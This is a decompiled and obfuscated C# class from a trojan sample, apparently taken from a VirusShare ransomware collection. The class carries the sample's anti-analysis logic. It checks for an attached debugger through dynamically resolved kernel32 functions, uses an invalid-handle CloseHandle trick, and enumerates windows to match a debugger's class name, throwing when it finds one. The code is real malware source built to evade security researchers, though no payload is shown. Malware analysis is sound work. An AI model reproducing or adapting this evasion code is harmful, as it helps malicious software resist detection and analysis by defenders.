// Decompiled with JetBrains decompiler
// Type: A.c5cd1c1565124b9bb718bcdf3d9dc82f8
// Assembly: WindowsApplication2Loader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F7227F94-C268-4B4C-B7D7-E3B6EE9F4271
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-0a49fbe363dae0e535e59b4659144d2f38783dadf7ba78ab924ca88ccb1975b4.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace A
{
  internal sealed class c5cd1c1565124b9bb718bcdf3d9dc82f8
  {
    internal const uint c91423c691e640172f05aaa4c62c1dc8a = 1024;
    internal const uint cd407b65b24f03952f4e5ea4c0781d053 = 64;
    internal const int cb4d31dd9a5b348fee722c56da0ee7d63 = 0;
    private static bool c5ca13bf1f0ae0dd58c72bcbdde1c46ce;

    [DllImport("kernel32.dll", EntryPoint = "SetLastError")]
    internal static extern void c28f2d150169737a777b1b03ce1f241b7(uint _param0);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
    internal static extern int c7d96b8b98b0fee2159c00e49ea89cd38(IntPtr _param0);

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    internal static extern IntPtr c0d0545a37a188001480084f4dd5925a3(
      uint _param0,
      int _param1,
      uint _param2);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcessId")]
    internal static extern uint c549c5411518ea02d4c260b76009a2171();

    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary", CharSet = CharSet.Auto, SetLastError = true)]
    internal static extern IntPtr cc397a08ce904ba9b42d3c6428e064530(string _param0);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c5cd1c1565124b9bb718bcdf3d9dc82f8.cc7a6e837d90860cbac9a5adb0f3cea5e cd838566cfd8360da4467f0d2ea507ff0(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c5cd1c1565124b9bb718bcdf3d9dc82f8.ce86665608460550c214669aa9ebaeeaa c74dca0531416b50542b3613ddb3ac378(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c5cd1c1565124b9bb718bcdf3d9dc82f8.ceab3b92467609861c030f1c73bdfe132 cd971628d105c13eabc510f6ee474b3e0(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c5cd1c1565124b9bb718bcdf3d9dc82f8.cc22924e4cb768f0e6f914af0e89d971d c76c7ce2d5b02f7578a648dd39981ec70(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c5cd1c1565124b9bb718bcdf3d9dc82f8.cb40b5a667901d8c9da1ad7b0c9b8a6f3 cbff17b74ce57a3f1ff810cd262447b1e(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern c5cd1c1565124b9bb718bcdf3d9dc82f8.c15b6dbccf3a9cf8531cb264149fd04a3 c0d602a1b81a36b0843b52ae9c33ff0a0(
      IntPtr _param0,
      string _param1);

    private static int c0fb10e51e97f46c778d8641f36cae692(IntPtr _param0, IntPtr _param1)
    {
      string[] strArray = new string[1]
      {
        c617fe52da0caa26ea9148d0618f48282.c8b16d54c6e0856c27aa8a7c100a0ad63(151)
      };
      string str1 = c5cd1c1565124b9bb718bcdf3d9dc82f8.c2496966f8a1d932f3aafbb728d00250a(_param0);
      foreach (string str2 in strArray)
      {
        if (ca717684ca484dbbf06b81bda60d54457.ca68ee7d21075db206eea02989df78421(str1, str2, true) == 0)
        {
label_2:
          switch (5)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (c5cd1c1565124b9bb718bcdf3d9dc82f8.c0fb10e51e97f46c778d8641f36cae692);
              }
              c5cd1c1565124b9bb718bcdf3d9dc82f8.c5ca13bf1f0ae0dd58c72bcbdde1c46ce = true;
              return 0;
          }
        }
      }
label_8:
      switch (4)
      {
        case 0:
          goto label_8;
        default:
          return 1;
      }
    }

    [DllImport("user32.dll", EntryPoint = "GetClassName", CharSet = CharSet.Auto)]
    internal static extern int c6366eab51abc2735455a63cbe340dcb9(
      IntPtr _param0,
      StringBuilder _param1,
      int _param2);

    internal static string c2496966f8a1d932f3aafbb728d00250a(IntPtr _param0)
    {
      StringBuilder stringBuilder = cb9df9618767034f15e3968b6b47bfe17.ca68ee7d21075db206eea02989df78421(260);
      c5cd1c1565124b9bb718bcdf3d9dc82f8.c6366eab51abc2735455a63cbe340dcb9(_param0, stringBuilder, ce14ef7710205b8c4e15b0eed18234039.c6bccb7429e4662d04bc45982e6b18741((object) stringBuilder));
      return c98fb73f20c45debeb18aff0fc78f5087.c6bccb7429e4662d04bc45982e6b18741((object) stringBuilder);
    }

    internal static void c89b488929b1d2b9cb3fb9cdcb605e658()
    {
      if (!c5cd1c1565124b9bb718bcdf3d9dc82f8.cc6ed3cd623db18dacbb581a1d339b708())
        return;
label_1:
      switch (1)
      {
        case 0:
          goto label_1;
        default:
          if (false)
          {
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (c5cd1c1565124b9bb718bcdf3d9dc82f8.c89b488929b1d2b9cb3fb9cdcb605e658);
          }
          throw c4511b11bf53162ab65769c62a222e013.ca68ee7d21075db206eea02989df78421(c617fe52da0caa26ea9148d0618f48282.c8b16d54c6e0856c27aa8a7c100a0ad63(166));
      }
    }

    internal static bool cc6ed3cd623db18dacbb581a1d339b708()
    {
      try
      {
        if (c93459fa792ae28b316494de95f93924d.ca68ee7d21075db206eea02989df78421())
        {
label_1:
          switch (3)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (c5cd1c1565124b9bb718bcdf3d9dc82f8.cc6ed3cd623db18dacbb581a1d339b708);
              }
              return true;
          }
        }
        else
        {
          IntPtr num1 = c5cd1c1565124b9bb718bcdf3d9dc82f8.cc397a08ce904ba9b42d3c6428e064530(c617fe52da0caa26ea9148d0618f48282.c8b16d54c6e0856c27aa8a7c100a0ad63(310));
          c5cd1c1565124b9bb718bcdf3d9dc82f8.cc22924e4cb768f0e6f914af0e89d971d cc22924e4cb768f0e6f914af0e89d971d = c5cd1c1565124b9bb718bcdf3d9dc82f8.c76c7ce2d5b02f7578a648dd39981ec70(num1, c617fe52da0caa26ea9148d0618f48282.c8b16d54c6e0856c27aa8a7c100a0ad63(335));
          if (cc22924e4cb768f0e6f914af0e89d971d != null)
          {
label_6:
            switch (7)
            {
              case 0:
                goto label_6;
              default:
                if (c6d3bdaf9d3631fdccc6efaf4bac8dd02.c6bccb7429e4662d04bc45982e6b18741((object) cc22924e4cb768f0e6f914af0e89d971d) != 0)
                {
label_8:
                  switch (1)
                  {
                    case 0:
                      goto label_8;
                    default:
                      return true;
                  }
                }
                else
                  break;
            }
          }
          IntPtr num2 = c5cd1c1565124b9bb718bcdf3d9dc82f8.c0d0545a37a188001480084f4dd5925a3(1024U, 0, c5cd1c1565124b9bb718bcdf3d9dc82f8.c549c5411518ea02d4c260b76009a2171());
          if (ca02c5209b670458aacc909f569708e08.ca68ee7d21075db206eea02989df78421(num2, IntPtr.Zero))
          {
label_11:
            switch (1)
            {
              case 0:
                goto label_11;
              default:
                try
                {
                  c5cd1c1565124b9bb718bcdf3d9dc82f8.ceab3b92467609861c030f1c73bdfe132 ceab3b92467609861c030f1c73bdfe132 = c5cd1c1565124b9bb718bcdf3d9dc82f8.cd971628d105c13eabc510f6ee474b3e0(num1, c617fe52da0caa26ea9148d0618f48282.c8b16d54c6e0856c27aa8a7c100a0ad63(370));
                  if (ceab3b92467609861c030f1c73bdfe132 != null)
                  {
label_13:
                    switch (3)
                    {
                      case 0:
                        goto label_13;
                      default:
                        int num3 = 0;
                        if (c9e8ff4041da6ef3035bbdd7d5103b0ed.c6bccb7429e4662d04bc45982e6b18741((object) ceab3b92467609861c030f1c73bdfe132, num2, ref num3) != 0)
                        {
label_15:
                          switch (4)
                          {
                            case 0:
                              goto label_15;
                            default:
                              if (num3 != 0)
                              {
label_17:
                                switch (3)
                                {
                                  case 0:
                                    goto label_17;
                                  default:
                                    return true;
                                }
                              }
                              else
                                break;
                          }
                        }
                        else
                          break;
                        break;
                    }
                  }
                  else
                    break;
                }
                finally
                {
                  c5cd1c1565124b9bb718bcdf3d9dc82f8.c7d96b8b98b0fee2159c00e49ea89cd38(num2);
                }
                break;
            }
          }
          bool flag = false;
          try
          {
            c5cd1c1565124b9bb718bcdf3d9dc82f8.c7d96b8b98b0fee2159c00e49ea89cd38(new IntPtr(305419896));
          }
          catch
          {
            flag = true;
          }
          if (flag)
          {
label_24:
            switch (6)
            {
              case 0:
                goto label_24;
              default:
                return true;
            }
          }
          else
          {
            try
            {
              c5cd1c1565124b9bb718bcdf3d9dc82f8.c15b6dbccf3a9cf8531cb264149fd04a3 c15b6dbccf3a9cf8531cb264149fd04a3 = c5cd1c1565124b9bb718bcdf3d9dc82f8.c0d602a1b81a36b0843b52ae9c33ff0a0(c5cd1c1565124b9bb718bcdf3d9dc82f8.cc397a08ce904ba9b42d3c6428e064530(c617fe52da0caa26ea9148d0618f48282.c8b16d54c6e0856c27aa8a7c100a0ad63(423)), c617fe52da0caa26ea9148d0618f48282.c8b16d54c6e0856c27aa8a7c100a0ad63(444));
              if (c15b6dbccf3a9cf8531cb264149fd04a3 != null)
              {
label_27:
                switch (6)
                {
                  case 0:
                    goto label_27;
                  default:
                    c5cd1c1565124b9bb718bcdf3d9dc82f8.c5ca13bf1f0ae0dd58c72bcbdde1c46ce = false;
                    c85c2e93c4eddf10bedc0a7f7c16f3413.c6bccb7429e4662d04bc45982e6b18741((object) c15b6dbccf3a9cf8531cb264149fd04a3, new c5cd1c1565124b9bb718bcdf3d9dc82f8.c20038198246cd1c2fdc851d80337a01f(c5cd1c1565124b9bb718bcdf3d9dc82f8.c0fb10e51e97f46c778d8641f36cae692), IntPtr.Zero);
                    if (c5cd1c1565124b9bb718bcdf3d9dc82f8.c5ca13bf1f0ae0dd58c72bcbdde1c46ce)
                    {
label_29:
                      switch (3)
                      {
                        case 0:
                          goto label_29;
                        default:
                          return true;
                      }
                    }
                    else
                      break;
                }
              }
            }
            catch
            {
            }
          }
        }
      }
      catch
      {
      }
      return false;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal sealed class c5bda3d717c4d510fb45b0c1e36ef291f
    {
      internal IntPtr c567dd6b94f27f3acbe7016ab36d09357;
      internal IntPtr c01295f28836aea11fb784ffc1937db04;
      internal IntPtr cf52d379dfd37907d522355790206ff8c;
      internal IntPtr cb791573130d8d2c21d0b14ad7a6718eb;
      internal IntPtr cf9f3aeb571e7f58555e29fedd08fc2b6;
      internal IntPtr cfb16b9608287251af7f43acaa46e47e5;
    }

    internal delegate int cc7a6e837d90860cbac9a5adb0f3cea5e(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      c5cd1c1565124b9bb718bcdf3d9dc82f8.c5bda3d717c4d510fb45b0c1e36ef291f ProcessInformation,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int ce86665608460550c214669aa9ebaeeaa(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      out uint debugPort,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int cc22924e4cb768f0e6f914af0e89d971d();

    internal delegate void cb40b5a667901d8c9da1ad7b0c9b8a6f3([MarshalAs(UnmanagedType.LPStr)] string lpOutputString);

    internal delegate int ceab3b92467609861c030f1c73bdfe132(
      IntPtr hProcess,
      ref int pbDebuggerPresent);

    internal delegate int c20038198246cd1c2fdc851d80337a01f(IntPtr wnd, IntPtr lParam);

    internal delegate int c15b6dbccf3a9cf8531cb264149fd04a3(
      c5cd1c1565124b9bb718bcdf3d9dc82f8.c20038198246cd1c2fdc851d80337a01f lpEnumFunc,
      IntPtr lParam);
  }
}
